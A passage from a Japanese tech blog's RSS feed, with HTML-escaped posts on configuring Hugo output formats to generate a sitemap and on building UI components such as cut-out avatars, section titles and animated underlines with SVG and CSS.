&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;td>true&lt;/td>
&lt;td>false&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Sitemap&lt;/td>
&lt;td>application/xml&lt;/td>
&lt;td>&lt;/td>
&lt;td>sitemap&lt;/td>
&lt;td>sitemap&lt;/td>
&lt;td>&lt;/td>
&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;td>true&lt;/td>
&lt;td>false&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>WebAppManifest&lt;/td>
&lt;td>application/manifest+json&lt;/td>
&lt;td>&lt;/td>
&lt;td>manifest&lt;/td>
&lt;td>manifest&lt;/td>
&lt;td>&lt;/td>
&lt;td>true&lt;/td>
&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;td>false&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/div>
&lt;h4 id="出力形式を設定する">出力形式を設定する&lt;/h4>
&lt;p>以下は、出力形式に関する設定オプションの全リストとそのデフォルト値になります。&lt;/p>
&lt;dl>
&lt;dt>name&lt;/dt>
&lt;dd>出力形式の識別子です。これは、ページに必要な出力形式を定義するために使用されます。&lt;/dd>
&lt;dt>mediaType&lt;/dt>
&lt;dd>定義されたメディアタイプのTypeと一致しなければなりません。&lt;/dd>
&lt;dt>path&lt;/dt>
&lt;dd>出力ファイルを保存するサブパス。&lt;/dd>
&lt;dt>baseName&lt;/dt>
&lt;dd>ファイル名です。デフォルトはindex。&lt;/dd>
&lt;dt>rel&lt;/dt>
&lt;dd>リンクタグのrel値を作成するために使用します。デフォルトはalternate。&lt;/dd>
&lt;dt>protocol&lt;/dt>
&lt;dd>この出力形式に対して、baseURL の &amp;ldquo;http://&amp;rdquo; または &amp;ldquo;https://&amp;rdquo; を置き換えます。&lt;/dd>
&lt;dt>isPlainText&lt;/dt>
&lt;dd>テンプレートにGoのプレーンテキストテンプレートパーサーを使用します。デフォルト: false。&lt;/dd>
&lt;dt>isHTML&lt;/dt>
&lt;dd>HTMLタイプのフォーマットにのみ関連する状況で使用されます; 例えば、ページのエイリアスなどです。&lt;/dd>
&lt;dt>noUgly&lt;/dt>
&lt;dd>uglyURLs がサイト内で true に設定されている場合、醜い URL をオフにするために使用されます。デフォルト：false&lt;/dd>
&lt;dt>notAlternative&lt;/dt>
&lt;dd>このフォーマットをPageのAlternativeOutputFormatsフォーマットのリストに含めることが意味をなさない場合（例えば、CSSなど）有効にします。&lt;br>注意点として、必ずしも他のフォーマットを置き換えるわけではないので、ここではalternateではなくalternativeという用語を使っています。デフォルト：false&lt;/dd>
&lt;dt>permalinkable&lt;/dt>
&lt;dd>.Permalink と .RelPermalink が main ではなくレンダリング出力形式を返すようにしました。これは、HTMLとAMPでデフォルトで有効になっています。デフォルト：false&lt;/dd>
&lt;dt>weight&lt;/dt>
&lt;dd>0 以外の値を設定すると、最初のソート条件として使用されます。&lt;/dd>
&lt;/dl>
&lt;h2 id="出力するページを選択">出力するページを選択&lt;/h2>
&lt;p>最後に出力するページに関してです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">outputs&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">home&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="l">HTML, Sitemap, RSS]&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>この部分はどのページで出力するかを選択できます。&lt;br>
今回はサイトマップを作成したいので、ドキュメントルートに当たる home (/index.html) 部分でのみの出力としてます。&lt;br>
HTML形式と、Sitemap、RSSを出力するようにしてます。HTMLでは index.html を出力し、RSSでは index.xml のRSS形式のフィードを出力してます。そして、今回追加したSitemapでサイトマップ形式のファイルを出力するようにしました。&lt;/p>
&lt;p>各ページの初期状態での出力は下記を参考にしてください。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>page&lt;/th>
&lt;th>HTML&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>home&lt;/td>
&lt;td>HTML, RSS&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>section&lt;/td>
&lt;td>HTML, RSS&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>taxonomy&lt;/td>
&lt;td>HTML, RSS&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>term&lt;/td>
&lt;td>HTML, RSS&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="テンプレートファイルを追加する">テンプレートファイルを追加する&lt;/h2>
&lt;p>設定が終わったので、次はテンプレートファイルを設置します。&lt;br>
サイトマップ用のテンプレートを作成して、&lt;code>layouts/_default&lt;/code>ディレクトリに配置します。&lt;br>
ここが一番のポイントで、配置する際のファイル名は &lt;strong>[page].[outputFormatsの名前].[suffixe]&lt;/strong> となります。&lt;br>
つまり、今回でいうと &lt;strong>home.sitemap.xml&lt;/strong> となります。&lt;/p>
&lt;p>ただし、pageの場合は下記のようにmarkdownに埋め込んで出力します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-markdown:page/search.md" data-lang="markdown:page/search.md">---
title: &amp;#34;Search&amp;#34;
layout: &amp;#34;search&amp;#34;
outputs:
&lt;span class="k">-&lt;/span> html
&lt;span class="k">-&lt;/span> json
---
&lt;/code>&lt;/pre>&lt;/div>&lt;p>これによって、&lt;code>layouts/page/search.html&lt;/code> と &lt;code>layouts/page/search.json&lt;/code> ファイルを使用して出力ファイルを作成します。&lt;/p>
&lt;h2 id="おすすめの書籍">おすすめの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/Markdown%e3%83%a9%e3%82%a4%e3%83%86%e3%82%a3%e3%83%b3%e3%82%b0%e5%85%a5%e9%96%80-%e3%83%97%e3%83%ac%e3%83%bc%e3%83%b3%e3%83%86%e3%82%ad%e3%82%b9%e3%83%88%e3%81%a7%e6%b0%97%e6%a5%bd%e3%81%ab%e6%9b%b8%e3%81%93%e3%81%86%ef%bc%81-%e6%8a%80%e8%a1%93%e3%81%ae%e6%b3%89%e3%82%b7%e3%83%aa%e3%83%bc%e3%82%ba%ef%bc%88NextPublishing%ef%bc%89-%e8%97%a4%e5%8e%9f-%e6%83%9f/dp/4844398369/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/514KHlwilvL.jpg" alt=" Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) &lt;/h2>
&lt;p> 【プレーンテキストでらくらくライティング! Markdownを使いこなそう! 】 本書は、文章を書く=ライティングを「気楽に」行うための道具としての「Markdown」形式を紹介し、その使い方を詳しく解説しています。Wordなどのワープロソフトに限定されることなく、テキストエディタやMarkdown専用エディタ、ポメラなどの文書入力専用機、さらにはスマートホン上でも「見出し」や「強調」といった文章執筆に必要な情報を共有するための書式であるMarkdownの書き方やその定義や起源を、初心者でもわかりやすく紹介しています。 〈本書の対象読者〉 執筆のストレスを減らして集中したい人 PCが古くて軽いアプリで執筆したい人 いろいろなアプリで原稿を使いまわしたい人 思いついた時にスマホでメモ書きして原稿にまとめたい人 続きを読む 。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>SVGとCSSでおしゃれでクールな最新のデザインにする</title><link>https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/</link><pubDate>Mon, 24 Jan 2022 16:18:06 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/catch.jpg" alt="Featured image of post SVGとCSSでおしゃれでクールな最新のデザインにする" />&lt;p>&lt;strong>出典元&lt;/strong>：&lt;a class="link" href="https://ishadeed.com/article/building-components-svg-css/" target="_blank" rel="noopener"
> Building UI Components With SVG and CSS - Ahmad Shadeed &lt;/a>&lt;/p>
&lt;p>SVGはアイコンやイラストだけでなく、開発者が時々忘れてしまう隠れた力をたくさん持っています。&lt;br>
CSSと比較してSVGを使用することが非常に理にかなっているユースケースはたくさんあります。たとえば、円形の読み込みアニメーションを作成したり、画像にマスクを適用したりします。このような場合、CSSを使用できないという意味ではありませんが、使用する手法（マスクなど）に基づいてクロスブラウザの問題と戦うのは難しい場合があるため、SVGを使用すると時間と労力を節約できます。&lt;/p>
&lt;p>SVGの優れている点は、応答性、パフォーマンス、およびHTML＆CSSを使用してすぐに使用できることです。この記事では、SVGをHTMLおよびCSSとともに使用して特定のUIコンポーネントを構築できるさまざまなユースケースを紹介することを目標としています。&lt;/p>
&lt;p>それでは、ユースケースを見てみましょう。&lt;/p>
&lt;h2 id="カットアウトアバター">カットアウトアバター&lt;/h2>
&lt;p>切り抜かれたアバターは、FacebookのCSSを調べているときに見つけたものです。&lt;br>
メッセンジャーでは、ユーザーアバターにバッジを付けることができ、バッジ用のスペースを割り当てるためにアバターが切り取られます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 214;
flex-basis: 514px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-1-1.png" data-size="1750x816">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-1-1.png"
width="1750"
height="816"
loading="lazy"
alt="SVGとCSSでおしゃれでクールな最新のデザインにするの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>これは、CSSの白い境界線を追加することで実行できます（簡単な修正として）が、さらに動的SVGコンポーネントに取り入れてみましょう。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">badge&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">border&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="kt">px&lt;/span> &lt;span class="kc">solid&lt;/span> &lt;span class="mh">#ff&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>borderが機能する場合、なぜSVGを使用するのか考えているかもしれませんが、間違いではありません。&lt;br>
しかし、他よりも優れた解決策があります。数学の授業で、教師が問題にさまざまな解決策がある可能性があり、そのうちの1つが柔軟性の点で優れている可能性があると述べたことを覚えていますか？今回の問題もそれと同じです。&lt;/p>
&lt;p>とにかく、border の解決策がどのようにすぐに失敗するかを示してみましょう。&lt;/p>
&lt;p>失敗例&lt;/p>
&lt;ul>
&lt;li>ホバー時：カードの背景が変わるため、白い境界線が奇妙に見えます。&lt;/li>
&lt;li>ダークモード：白い境界線は黒っぽい背景の上になります&lt;/li>
&lt;/ul>
&lt;p>次の図では、バッジの白い境界線が暗い背景とホバー状態にどのように干渉しているかに注目してください。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 188;
flex-basis: 452px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-1-2.png" data-size="1750x928">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-1-2.png"
width="1750"
height="928"
loading="lazy"
alt="SVGとCSSでおしゃれでクールな最新のデザインにするの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>ホバー時に境界線colorを変更することでそれを解決できますが、それは最善の解決策とは思えません。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">card__badge&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">border&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="kt">px&lt;/span> &lt;span class="kc">solid&lt;/span> &lt;span class="mh">#ff&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">card&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nd">hover&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="nc">card__badge&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">border-color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">lightgrey&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">@&lt;/span>&lt;span class="k">media&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="nt">prefers-color-scheme&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nt">dark&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">card__badge&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">border-color&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mh">#454545&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>SVGを使用すると、バッジの下の領域をカットすることで、上記の問題をより適切に解決できます。そうすれば、あらゆる種類のバックグラウンドで機能します。&lt;/p>
&lt;p>次の図を見てください。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 193;
flex-basis: 463px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-1-3.png" data-size="1600x828">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-1-3.png"
width="1600"
height="828"
loading="lazy"
alt="SVGとCSSでおしゃれでクールな最新のデザインにするの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>アバターを含めるためにSVG &lt;code>&amp;lt;image&amp;gt;&lt;/code>要素を使用しています。バッジ領域を切り取るには、2つの&lt;code>&amp;lt;circle&amp;gt;&lt;/code>要素を作成する必要があります。1つは白で、もう1つは黒です。&lt;br>
マスクでは、黒で塗りつぶされた要素はすべて非表示になります、白の要素は表示されます。黒い円は、半径18の右下隅に配置されています。&lt;br>
開発者ツールでは、上記は減算と呼ばれます。大きい円から小さい円を引きます。&lt;br>
これが最後のデモです&lt;/p>
&lt;script async src="//jsfiddle.net/wyoshi/09f3rqbn/1/embed/html,css,result/dark/">&lt;/script>
&lt;h2 id="タイトルの装飾">タイトルの装飾&lt;/h2>
&lt;p>あるクライアントのプロジェクトで、SVGとCSSを組み合わせてセクションタイトルをデザイン・構築したことがあります。&lt;br>
セキュリティに関連するブランドなので、このようなスタイルを使うことがあるかもしれません。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 248;
flex-basis: 596px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-2-1.png" data-size="1750x704">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-2-1.png"
width="1750"
height="704"
loading="lazy"
alt="SVGとCSSでおしゃれでクールな最新のデザインにするの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>コンポーネントは短いタイトルと長いタイトルで動作する必要があり、タイトルが長すぎる場合は、レイアウトを壊さずに複数の行に折り返す必要があります。&lt;br>
それを構築するためには、以下のような対応が必要です。&lt;/p>
&lt;ul>
&lt;li>最初に、固定部分（右側）をコピーして、インラインSVGとして追加する。&lt;/li>
&lt;li>CSSを使用して、タイトルの下に行を作成しました。また、行の最初と最後にある小さな円にも使用。&lt;/li>
&lt;li>不要なポジショニングを使用しないように、flexboxを使用してコンポーネントレイアウトを作成。&lt;/li>
&lt;/ul>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 248;
flex-basis: 596px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-2-2.png" data-size="1750x704">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-2-2.png"
width="1750"
height="704"
loading="lazy"
alt="SVGとCSSでおしゃれでクールな最新のデザインにするの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>それでは基本的なHTMLとCSSから始めましょう。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">h2&lt;/span> &lt;span class="na">class&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;c-section__title&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">span&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>CSS is awesome&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">span&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">svg&lt;/span> &lt;span class="na">xmlns&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;http://www.w3.org/2000/svg&amp;#34;&lt;/span> &lt;span class="na">width&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;128&amp;#34;&lt;/span> &lt;span class="na">height&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;34.5&amp;#34;&lt;/span> &lt;span class="na">viewBox&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;0 0 128 34.5&amp;#34;&lt;/span> &lt;span class="na">preserveAspectRatio&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;none&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">path&lt;/span> &lt;span class="na">fill&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;none&amp;#34;&lt;/span> &lt;span class="na">stroke&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;#d8d8d8&amp;#34;&lt;/span> &lt;span class="na">stroke-width&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;2&amp;#34;&lt;/span> &lt;span class="na">d&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;M127 1H33.5L1 33.5&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">path&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">svg&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">h2&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">c-section__title&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">max-width&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">700&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">width&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">fit-content&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">flex&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">margin-left&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">margin-right&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 344;
flex-basis: 826px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-2-3.png" data-size="1750x508">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-2-3.png"
width="1750"
height="508"
loading="lazy"
alt="SVGとCSSでおしゃれでクールな最新のデザインにするの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>次のステップでは、&lt;code>span&lt;/code> 要素の下にボーダーを追加して、SVGに接続された線を追加したいと思います。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 195;
flex-basis: 468px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-2-4.png" data-size="1750x896">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-2-4.png"
width="1750"
height="896"
loading="lazy"
alt="SVGとCSSでおしゃれでクールな最新のデザインにするの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>SVGが回線に接続されていないことに気づきました。&lt;br>
&lt;code>flexbox&lt;/code>を使用しているので、修正するのは簡単です。&lt;code>flex-item&lt;/code> を&lt;code>flex-end&lt;/code>に揃える必要があります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">c-section__title&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">max-width&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">700&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">width&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">fit-content&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">flex&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">align-items&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">flex-end&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">margin-left&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">margin-right&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>次に、絶対位置指定で擬似要素を使って、最初と最後に円を追加する必要があります。&lt;/p>
&lt;script async src="//jsfiddle.net/wyoshi/j4pydfmb/1/embed/html,css,result/dark/">&lt;/script>
&lt;p>また、SVGを使うと何がいいかというと、SVGのパスを点線にして、アニメーションさせることができるのです。&lt;br>
そのためには、SVGで書き出されたパスがアウトライン化されていないことを確認する必要があります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">path&lt;/span> &lt;span class="na">d&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;M127 1H33.5L1 33.5&amp;#34;&lt;/span> &lt;span class="na">fill&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;none&amp;#34;&lt;/span> &lt;span class="na">stroke&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;#d8d8d8&amp;#34;&lt;/span> &lt;span class="na">stroke-width&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;2&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="nt">path&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>このテクニックは、Jake Archibald氏の&lt;a class="link" href="https://jakearchibald.com/2013/animated-line-drawing-svg/" target="_blank" rel="noopener"
>素晴らしい記事&lt;/a> から学びました。このアイデアは、パスの長さを求めるというものです。&lt;/p>
&lt;p>Chrome DevToolsで、SVGを検査し、&lt;code>&amp;lt;path&amp;gt;&lt;/code>要素を選択すると、その末尾の横に&lt;code>== $0&lt;/code>と表示されることがわかります。これを選択したまま、コンソールに移動し、以下のスクリプトを記述します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="nx">$0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getTotalLength&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="c1">// 139.46
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>このようなことをしなくても、DOMから要素を選択するには、&lt;code>$0&lt;/code>が手っ取り早いです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="kd">let&lt;/span> &lt;span class="nx">sectionPath&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;#path&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">sectionPath&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getTotalLength&lt;/span>&lt;span class="p">());&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>それはこの例の文脈の中での簡単なヒントでした。&lt;/p>
&lt;p>さて、長さが決まったら、あとは好きなようにやってみましょう。例えば、ホバー時にアニメーションさせることができます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">c-section__title--dashed&lt;/span> &lt;span class="nt">path&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">stroke-dasharray&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">139&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">stroke-dashoffset&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">transition&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">0.7&lt;/span>&lt;span class="kt">s&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">c-section__title--dashed&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nd">hover&lt;/span> &lt;span class="nt">path&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">stroke-dashoffset&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">139&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>または、単純に点線に変えることもできます（この場合、パスの長さを知る必要はありません）。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 248;
flex-basis: 596px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-2-6.png" data-size="1750x704">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/cut-out-avatar-2-6.png"
width="1750"
height="704"
loading="lazy"
alt="SVGとCSSでおしゃれでクールな最新のデザインにするの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;script async src="//jsfiddle.net/wyoshi/wp9k7Lb6/1/embed/html,css,result/dark/">&lt;/script>
&lt;h2 id="svgを使ったカスタムリンクの下線">SVGを使ったカスタムリンクの下線&lt;/h2>
&lt;p>SVGを使って、ワクワクするようなカスタムリンクのアンダーラインを作成することができます。私は数年前に、ランダムにパスを生成し、ホバー時にそれを再描画するスクリプトを作成しました。&lt;/p>
&lt;p>次の図で、プレビューの前と後を考えてみてください。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 248;
flex-basis: 596px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/custom-underline-1-1.png" data-size="1750x704">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/custom-underline-1-1.png"
width="1750"
height="704"
loading="lazy"
alt="SVGとCSSでおしゃれでクールな最新のデザインにするの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>アイデアは、各リンクにSVGを挿入することであり、次のようになります。&lt;/p>
